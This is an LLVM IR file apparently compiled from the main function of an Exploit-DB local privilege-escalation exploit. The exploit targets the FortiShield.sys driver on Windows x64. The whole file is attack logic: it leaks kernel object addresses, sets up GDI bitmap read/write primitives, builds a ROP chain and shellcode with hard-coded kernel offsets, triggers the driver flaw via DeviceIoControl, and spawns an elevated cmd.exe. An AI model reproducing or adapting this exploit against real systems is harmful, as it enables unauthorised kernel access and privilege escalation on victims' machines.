; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows_x86-64/local/extr_41722.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows_x86-64/local/extr_41722.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.bitmap_structure = type { i32, i32 }
%struct.TYPE_3__ = type { i64 }

@.str = private unnamed_addr constant [6 x i8] c"ntdll\00", align 1
@ntdll = common dso_local global i32* null, align 8
@.str.1 = private unnamed_addr constant [35 x i8] c"[!] Error while loading ntdll: %d\0A\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"user32\00", align 1
@user32dll = common dso_local global i32* null, align 8
@.str.3 = private unnamed_addr constant [37 x i8] c"[!] Error while loading user32: %d.\0A\00", align 1
@object_number = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [173 x i8] c"[+] Accelerator Table[0] HANDLE: %I64x\0A[+] Accelerator Table[0] HANDLE: %I64x\0A[+] Accelerator Table[0] kernel address: %I64x\0A[+] Accelerator Table[0] kernel address: %I64x\0A\00", align 1
@.str.5 = private unnamed_addr constant [54 x i8] c"[+] Replacing Accelerator Tables with BitMap objects\0A\00", align 1
@.str.6 = private unnamed_addr constant [42 x i8] c"[+] Manager BitMap pvScan0 offset: %I64x\0A\00", align 1
@.str.7 = private unnamed_addr constant [41 x i8] c"[+] Worker BitMap pvScan0 offset: %I64x\0A\00", align 1
@.str.8 = private unnamed_addr constant [16 x i8] c"\\\\.\\FortiShield\00", align 1
@GENERIC_READ = common dso_local global i32 0, align 4
@GENERIC_WRITE = common dso_local global i32 0, align 4
@OPEN_EXISTING = common dso_local global i32 0, align 4
@INVALID_HANDLE_VALUE = common dso_local global i64 0, align 8
@.str.9 = private unnamed_addr constant [53 x i8] c"[!] Error while creating a handle to the driver: %d\0A\00", align 1
@.str.10 = private unnamed_addr constant [13 x i8] c"ntoskrnl.exe\00", align 1
@.str.11 = private unnamed_addr constant [16 x i8] c"FortiShield.sys\00", align 1
@.str.12 = private unnamed_addr constant [27 x i8] c"[+] Kernel found at: %llx\0A\00", align 1
@.str.13 = private unnamed_addr constant [36 x i8] c"[+] FortiShield.sys found at: %llx\0A\00", align 1
@trigger_callback = common dso_local global i32 0, align 4
@CREATE_SUSPENDED = common dso_local global i32 0, align 4
@.str.14 = private unnamed_addr constant [42 x i8] c"[!] Error while calling CreateThread: %d\0A\00", align 1
@THREAD_PRIORITY_HIGHEST = common dso_local global i32 0, align 4
@.str.15 = private unnamed_addr constant [47 x i8] c"[!] Error while calling SetThreadPriority: %d\0A\00", align 1
@.str.16 = private unnamed_addr constant [47 x i8] c"[+] Press ENTER to trigger the vulnerability.\0A\00", align 1
@INFINITE = common dso_local global i32 0, align 4
@.str.17 = private unnamed_addr constant [58 x i8] c"[+] Writing nt!MiGetPteAddress + 0x13 to Worker pvScan0.\0A\00", align 1
@.str.18 = private unnamed_addr constant [34 x i8] c"[+] Reading from Worker pvScan0.\0A\00", align 1
@.str.19 = private unnamed_addr constant [37 x i8] c"[+] PTE virtual base address: %I64x\0A\00", align 1
@.str.20 = private unnamed_addr constant [47 x i8] c"[+] PTE virtual address for 0x8b000000: %I64x\0A\00", align 1
@MEM_RELEASE = common dso_local global i32 0, align 4
@.str.21 = private unnamed_addr constant [41 x i8] c"[!] Error while calling VirtualFree: %d\0A\00", align 1
@.str.22 = private unnamed_addr constant [53 x i8] c"[+] Press ENTER to trigger the vulnerability again.\0A\00", align 1
@.str.23 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@.str.24 = private unnamed_addr constant [14 x i8] c"start cmd.exe\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = alloca i64, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca %struct.bitmap_structure, align 4
  %8 = alloca %struct.bitmap_structure, align 4
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i64, align 8
  %12 = alloca i64, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  %22 = alloca i64, align 8
  %23 = alloca i64, align 8
  %24 = alloca i32, align 4
  %25 = alloca i64, align 8
  %26 = alloca i64, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i32, align 4
  %31 = alloca i64, align 8
  %32 = alloca i64, align 8
  store i32 0, i32* %1, align 4
  %33 = call i8* @LoadLibrary(i32 ptrtoint ([6 x i8]* @.str to i32))
  %34 = bitcast i8* %33 to i32*
  store i32* %34, i32** @ntdll, align 8
  %35 = load i32*, i32** @ntdll, align 8
  %36 = icmp eq i32* %35, null
  br i1 %36, label %37, label %40

37:                                               ; preds = %0
  %38 = call i32 (...) @GetLastError()
  %39 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.1, i64 0, i64 0), i32 %38)
  store i32 1, i32* %1, align 4
  br label %248

40:                                               ; preds = %0
  %41 = call i8* @LoadLibrary(i32 ptrtoint ([7 x i8]* @.str.2 to i32))
  %42 = bitcast i8* %41 to i32*
  store i32* %42, i32** @user32dll, align 8
  %43 = load i32*, i32** @user32dll, align 8
  %44 = icmp eq i32* %43, null
  br i1 %44, label %45, label %48

45:                                               ; preds = %40
  %46 = call i32 (...) @GetLastError()
  %47 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.3, i64 0, i64 0), i32 %46)
  store i32 1, i32* %1, align 4
  br label %248

48:                                               ; preds = %40
  %49 = load i32, i32* @object_number, align 4
  %50 = zext i32 %49 to i64
  %51 = call i8* @llvm.stacksave()
  store i8* %51, i8** %2, align 8
  %52 = alloca i64, i64 %50, align 16
  store i64 %50, i64* %3, align 8
  %53 = load i32, i32* @object_number, align 4
  %54 = call i32 @create_accelerator_table(i64* %52, i32 %53)
  %55 = load i32, i32* @object_number, align 4
  %56 = zext i32 %55 to i64
  %57 = alloca %struct.TYPE_3__*, i64 %56, align 16
  store i64 %56, i64* %4, align 8
  %58 = load i32*, i32** @user32dll, align 8
  %59 = call i32 @leak_table_kernel_address(i32* %58, i64* %52, %struct.TYPE_3__** %57)
  %60 = getelementptr inbounds i64, i64* %52, i64 0
  %61 = load i64, i64* %60, align 16
  %62 = trunc i64 %61 to i32
  %63 = getelementptr inbounds i64, i64* %52, i64 1
  %64 = load i64, i64* %63, align 8
  %65 = trunc i64 %64 to i32
  %66 = getelementptr inbounds %struct.TYPE_3__*, %struct.TYPE_3__** %57, i64 0
  %67 = load %struct.TYPE_3__*, %struct.TYPE_3__** %66, align 16
  %68 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %67, i32 0, i32 0
  %69 = load i64, i64* %68, align 8
  %70 = trunc i64 %69 to i32
  %71 = getelementptr inbounds %struct.TYPE_3__*, %struct.TYPE_3__** %57, i64 1
  %72 = load %struct.TYPE_3__*, %struct.TYPE_3__** %71, align 8
  %73 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %72, i32 0, i32 0
  %74 = load i64, i64* %73, align 8
  %75 = trunc i64 %74 to i32
  %76 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.4, i64 0, i64 0), i32 %62, i32 %65, i32 %70, i32 %75)
  %77 = getelementptr inbounds %struct.TYPE_3__*, %struct.TYPE_3__** %57, i64 0
  %78 = load %struct.TYPE_3__*, %struct.TYPE_3__** %77, align 16
  %79 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %78, i32 0, i32 0
  %80 = load i64, i64* %79, align 8
  %81 = trunc i64 %80 to i32
  %82 = add nsw i32 %81, 24
  %83 = add nsw i32 %82, 56
  store i32 %83, i32* %5, align 4
  %84 = getelementptr inbounds %struct.TYPE_3__*, %struct.TYPE_3__** %57, i64 1
  %85 = load %struct.TYPE_3__*, %struct.TYPE_3__** %84, align 8
  %86 = getelementptr inbounds %struct.TYPE_3__, %struct.TYPE_3__* %85, i32 0, i32 0
  %87 = load i64, i64* %86, align 8
  %88 = trunc i64 %87 to i32
  %89 = add nsw i32 %88, 24
  %90 = add nsw i32 %89, 56
  store i32 %90, i32* %6, align 4
  %91 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([54 x i8], [54 x i8]* @.str.5, i64 0, i64 0))
  %92 = call i64 @create_bitmaps(i64* %52)
  %93 = bitcast %struct.bitmap_structure* %8 to i64*
  store i64 %92, i64* %93, align 4
  %94 = bitcast %struct.bitmap_structure* %7 to i8*
  %95 = bitcast %struct.bitmap_structure* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %94, i8* align 4 %95, i64 8, i1 false)
  %96 = load i32, i32* %5, align 4
  %97 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.6, i64 0, i64 0), i32 %96)
  %98 = load i32, i32* %6, align 4
  %99 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.7, i64 0, i64 0), i32 %98)
  %100 = load i32, i32* @GENERIC_READ, align 4
  %101 = load i32, i32* @GENERIC_WRITE, align 4
  %102 = or i32 %100, %101
  %103 = load i32, i32* @OPEN_EXISTING, align 4
  %104 = call i64 @CreateFile(i32 ptrtoint ([16 x i8]* @.str.8 to i32), i32 %102, i32 0, i32* null, i32 %103, i32 0, i32* null)
  store i64 %104, i64* %9, align 8
  %105 = load i64, i64* %9, align 8
  %106 = load i64, i64* @INVALID_HANDLE_VALUE, align 8
  %107 = icmp eq i64 %105, %106
  br i1 %107, label %108, label %111

108:                                              ; preds = %48
  %109 = call i32 (...) @GetLastError()
  %110 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.9, i64 0, i64 0), i32 %109)
  store i32 1, i32* %1, align 4
  store i32 1, i32* %10, align 4
  br label %246

111:                                              ; preds = %48
  %112 = call i64 @GetBaseAddr(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.10, i64 0, i64 0))
  store i64 %112, i64* %11, align 8
  %113 = call i64 @GetBaseAddr(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.11, i64 0, i64 0))
  store i64 %113, i64* %12, align 8
  %114 = load i64, i64* %11, align 8
  %115 = trunc i64 %114 to i32
  %116 = add nsw i32 %115, 5176037
  store i32 %116, i32* %13, align 4
  %117 = load i64, i64* %12, align 8
  %118 = trunc i64 %117 to i32
  %119 = add nsw i32 %118, 53584
  store i32 %119, i32* %14, align 4
  %120 = load i64, i64* %12, align 8
  %121 = trunc i64 %120 to i32
  %122 = add nsw i32 %121, 12147
  store i32 %122, i32* %15, align 4
  %123 = load i64, i64* %11, align 8
  %124 = trunc i64 %123 to i32
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.12, i64 0, i64 0), i32 %124)
  %126 = load i64, i64* %12, align 8
  %127 = trunc i64 %126 to i32
  %128 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.13, i64 0, i64 0), i32 %127)
  store i32 2228264, i32* %16, align 4
  %129 = load i32, i32* %13, align 4
  store i32 %129, i32* %17, align 4
  store i32 8, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %130 = load i64, i64* %11, align 8
  %131 = load i32, i32* %14, align 4
  %132 = load i32, i32* %15, align 4
  %133 = load i32, i32* %5, align 4
  %134 = load i32, i32* %6, align 4
  %135 = call i64 @allocate_rop_chain(i64 %130, i32 %131, i32 %132, i32 %133, i32 %134)
  store i64 %135, i64* %22, align 8
  store i32 0, i32* %24, align 4
  %136 = load i32, i32* @CREATE_SUSPENDED, align 4
  %137 = load i32, i32* %24, align 4
  %138 = call i64 @CreateThread(i32* null, i32 0, i32 ptrtoint (i32* @trigger_callback to i32), i32* null, i32 %136, i32 %137)
  store i64 %138, i64* %23, align 8
  %139 = load i64, i64* %23, align 8
  %140 = inttoptr i64 %139 to i8*
  %141 = icmp eq i8* %140, null
  br i1 %141, label %142, label %145

142:                                              ; preds = %111
  %143 = call i32 (...) @GetLastError()
  %144 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.14, i64 0, i64 0), i32 %143)
  store i32 1, i32* %1, align 4
  store i32 1, i32* %10, align 4
  br label %246

145:                                              ; preds = %111
  %146 = load i64, i64* %23, align 8
  %147 = load i32, i32* @THREAD_PRIORITY_HIGHEST, align 4
  %148 = call i64 @SetThreadPriority(i64 %146, i32 %147)
  store i64 %148, i64* %25, align 8
  %149 = load i64, i64* %25, align 8
  %150 = icmp eq i64 %149, 0
  br i1 %150, label %151, label %154

151:                                              ; preds = %145
  %152 = call i32 (...) @GetLastError()
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i64 0, i64 0), i32 %152)
  store i32 1, i32* %1, align 4
  store i32 1, i32* %10, align 4
  br label %246

154:                                              ; preds = %145
  %155 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.16, i64 0, i64 0))
  %156 = call i32 (...) @getchar()
  %157 = load i64, i64* %23, align 8
  %158 = call i32 @ResumeThread(i64 %157)
  %159 = load i64, i64* %9, align 8
  %160 = load i32, i32* %16, align 4
  %161 = ptrtoint i32* %17 to i64
  %162 = load i32, i32* %18, align 4
  %163 = ptrtoint i32* %19 to i64
  %164 = load i32, i32* %20, align 4
  %165 = call i64 @DeviceIoControl(i64 %159, i32 %160, i64 %161, i32 %162, i64 %163, i32 %164, i32* %21, i32* null)
  store i64 %165, i64* %26, align 8
  %166 = load i64, i64* %23, align 8
  %167 = load i32, i32* @INFINITE, align 4
  %168 = call i32 @WaitForSingleObject(i64 %166, i32 %167)
  %169 = load i64, i64* %11, align 8
  %170 = trunc i64 %169 to i32
  %171 = add nsw i32 %170, 291604
  %172 = add nsw i32 %171, 19
  store i32 %172, i32* %27, align 4
  %173 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.17, i64 0, i64 0))
  %174 = call i32 (...) @getchar()
  %175 = getelementptr inbounds %struct.bitmap_structure, %struct.bitmap_structure* %7, i32 0, i32 1
  %176 = load i32, i32* %175, align 4
  %177 = load i32, i32* %27, align 4
  %178 = call i32 @write_bitmap(i32 %176, i32 %177)
  %179 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.18, i64 0, i64 0))
  %180 = call i32 (...) @getchar()
  %181 = getelementptr inbounds %struct.bitmap_structure, %struct.bitmap_structure* %7, i32 0, i32 0
  %182 = load i32, i32* %181, align 4
  %183 = call i32 @read_bitmap(i32 %182)
  store i32 %183, i32* %28, align 4
  %184 = load i32, i32* %28, align 4
  %185 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.19, i64 0, i64 0), i32 %184)
  store i32 -1962934272, i32* %30, align 4
  %186 = load i32, i32* %30, align 4
  %187 = load i32, i32* %28, align 4
  %188 = call i32 @get_pxe_address_64(i32 %186, i32 %187)
  store i32 %188, i32* %29, align 4
  %189 = load i32, i32* %29, align 4
  %190 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.20, i64 0, i64 0), i32 %189)
  %191 = load i64, i64* %22, align 8
  %192 = load i32, i32* @MEM_RELEASE, align 4
  %193 = call i64 @VirtualFree(i64 %191, i32 0, i32 %192)
  store i64 %193, i64* %31, align 8
  %194 = load i64, i64* %31, align 8
  %195 = icmp eq i64 %194, 0
  br i1 %195, label %196, label %199

196:                                              ; preds = %154
  %197 = call i32 (...) @GetLastError()
  %198 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.21, i64 0, i64 0), i32 %197)
  store i32 1, i32* %1, align 4
  store i32 1, i32* %10, align 4
  br label %246

199:                                              ; preds = %154
  %200 = load i64, i64* %11, align 8
  %201 = load i32, i32* %14, align 4
  %202 = load i32, i32* %15, align 4
  %203 = load i32, i32* %29, align 4
  %204 = call i64 @allocate_shellcode(i64 %200, i32 %201, i32 %202, i32 %203)
  store i64 %204, i64* %32, align 8
  %205 = load i32, i32* @CREATE_SUSPENDED, align 4
  %206 = load i32, i32* %24, align 4
  %207 = call i64 @CreateThread(i32* null, i32 0, i32 ptrtoint (i32* @trigger_callback to i32), i32* null, i32 %205, i32 %206)
  store i64 %207, i64* %23, align 8
  %208 = load i64, i64* %23, align 8
  %209 = inttoptr i64 %208 to i8*
  %210 = icmp eq i8* %209, null
  br i1 %210, label %211, label %214

211:                                              ; preds = %199
  %212 = call i32 (...) @GetLastError()
  %213 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.14, i64 0, i64 0), i32 %212)
  store i32 1, i32* %1, align 4
  store i32 1, i32* %10, align 4
  br label %246

214:                                              ; preds = %199
  %215 = load i64, i64* %23, align 8
  %216 = load i32, i32* @THREAD_PRIORITY_HIGHEST, align 4
  %217 = call i64 @SetThreadPriority(i64 %215, i32 %216)
  store i64 %217, i64* %25, align 8
  %218 = load i64, i64* %25, align 8
  %219 = icmp eq i64 %218, 0
  br i1 %219, label %220, label %223

220:                                              ; preds = %214
  %221 = call i32 (...) @GetLastError()
  %222 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i64 0, i64 0), i32 %221)
  store i32 1, i32* %1, align 4
  store i32 1, i32* %10, align 4
  br label %246

223:                                              ; preds = %214
  %224 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.22, i64 0, i64 0))
  %225 = call i32 (...) @getchar()
  %226 = load i64, i64* %23, align 8
  %227 = call i32 @ResumeThread(i64 %226)
  %228 = load i64, i64* %9, align 8
  %229 = load i32, i32* %16, align 4
  %230 = ptrtoint i32* %17 to i64
  %231 = load i32, i32* %18, align 4
  %232 = ptrtoint i32* %19 to i64
  %233 = load i32, i32* %20, align 4
  %234 = call i64 @DeviceIoControl(i64 %228, i32 %229, i64 %230, i32 %231, i64 %232, i32 %233, i32* %21, i32* null)
  store i64 %234, i64* %26, align 8
  %235 = load i64, i64* %23, align 8
  %236 = load i32, i32* @INFINITE, align 4
  %237 = call i32 @WaitForSingleObject(i64 %235, i32 %236)
  %238 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.23, i64 0, i64 0))
  %239 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.24, i64 0, i64 0))
  %240 = getelementptr inbounds %struct.bitmap_structure, %struct.bitmap_structure* %7, i32 0, i32 1
  %241 = load i32, i32* %240, align 4
  %242 = call i32 @DeleteObject(i32 %241)
  %243 = getelementptr inbounds %struct.bitmap_structure, %struct.bitmap_structure* %7, i32 0, i32 0
  %244 = load i32, i32* %243, align 4
  %245 = call i32 @DeleteObject(i32 %244)
  store i32 0, i32* %1, align 4
  store i32 1, i32* %10, align 4
  br label %246

246:                                              ; preds = %223, %220, %211, %196, %151, %142, %108
  %247 = load i8*, i8** %2, align 8
  call void @llvm.stackrestore(i8* %247)
  br label %248

248:                                              ; preds = %246, %45, %37
  %249 = load i32, i32* %1, align 4
  ret i32 %249
}

declare dso_local i8* @LoadLibrary(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @GetLastError(...) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @create_accelerator_table(i64*, i32) #1

declare dso_local i32 @leak_table_kernel_address(i32*, i64*, %struct.TYPE_3__**) #1

declare dso_local i64 @create_bitmaps(i64*) #1

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i64 @CreateFile(i32, i32, i32, i32*, i32, i32, i32*) #1

declare dso_local i64 @GetBaseAddr(i8*) #1

declare dso_local i64 @allocate_rop_chain(i64, i32, i32, i32, i32) #1

declare dso_local i64 @CreateThread(i32*, i32, i32, i32*, i32, i32) #1

declare dso_local i64 @SetThreadPriority(i64, i32) #1

declare dso_local i32 @getchar(...) #1

declare dso_local i32 @ResumeThread(i64) #1

declare dso_local i64 @DeviceIoControl(i64, i32, i64, i32, i64, i32, i32*, i32*) #1

declare dso_local i32 @WaitForSingleObject(i64, i32) #1

declare dso_local i32 @write_bitmap(i32, i32) #1

declare dso_local i32 @read_bitmap(i32) #1

declare dso_local i32 @get_pxe_address_64(i32, i32) #1

declare dso_local i64 @VirtualFree(i64, i32, i32) #1

declare dso_local i64 @allocate_shellcode(i64, i32, i32, i32) #1

declare dso_local i32 @system(i8*) #1

declare dso_local i32 @DeleteObject(i32) #1

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind }
attributes #3 = { argmemonly nounwind willreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
